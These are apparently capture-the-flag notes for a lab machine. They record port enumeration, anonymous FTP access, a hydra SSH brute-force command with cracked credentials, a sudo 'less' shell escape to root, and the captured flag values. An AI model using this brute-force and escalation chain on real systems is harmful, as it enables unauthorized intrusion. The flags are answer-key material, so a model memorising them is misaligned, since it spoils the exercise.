<pre>
Machine IP: 10.10.222.12

Enum:
    Open ports:
        21/tcp open  ftp     vsftpd 3.0.3
            ftp-anon: Anonymous FTP login allowed (FTP code 230)
        22/tcp open  ssh    
        80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))


21/tcp ftp enum:
    /note_to_jake.txt => get note_to_jake.txt
        *possible username: jake,amy

22/tcp ssh brute force:
    $ hydra -l jake -P /root/Documents/wordlists/rockyou.txt 10.10.222.12 -t 4 ssh
        *creds: [22] login: jake   password: 987654321
            *User flag at /home/holt

Priv esc:
    $ sudo -l
        (ALL) NOPASSWD: /usr/bin/less
    
$ sudo less /etc/profile
*Press [shift&;]=> :
:!/bin/sh
        *Root flag at /root

User Flag: ee11cbb19052e40b07aac0ca060c23ee
Root Flag: 63a9f0ea7bb98050796b649e85481845
</pre>
